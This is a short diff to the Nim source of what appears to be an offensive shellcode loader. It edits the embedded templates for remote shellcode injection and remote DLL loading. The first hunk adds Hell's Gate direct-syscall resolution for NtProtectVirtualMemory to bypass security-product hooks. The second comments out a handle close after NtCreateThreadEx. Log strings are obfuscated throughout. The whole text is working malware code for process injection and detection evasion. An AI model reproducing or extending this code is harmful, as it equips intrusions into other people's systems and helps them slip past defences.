@@ -569,6 +569,14 @@ let ShellcoderemoteinjectStub * = """
                     # So we need to calculate the difference between the section start and the function start and may need to protect one more section
                     # Or we just allocate one more 4kB page so make sure the offset is no problem
                     var allocateSize: SIZE_T = cast[SIZE_T](hookShellcodeBytes.len) + 0x1000
+                    
+                    when defined(Hellsgate):
+                        if getSyscall(ntProtectTable):
+                            syscall = ntProtectTable.wSysCall
+                        else:
+                            when defined(verbose):
+                                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                    
                     status = NtProtectVirtualMemory(tProcess, addr protectAddress, addr allocateSize, PAGE_READWRITE, addr oldProtect)
                     when defined(logFile):
                         logVerbose(obf("[*] NtProtectVirtualMemory RW for address: ") & cast[string](repr(protectAddress)) & obf(" status: ") & cast[string](toHex(status)) & "\r\n")
@@ -1419,7 +1427,7 @@ let RemoteLoadDllStub* = """
                     ds, FALSE, 0, 0, 0, NULL)
                 when defined(verbose):
                     echo obf("[*] NtCreateThreadEx: "), toHex(status)
-                status = NtClose(tHandle)
+                #status = NtClose(tHandle)
                 Sleep(500)
                 if(status == 0):
                     return true
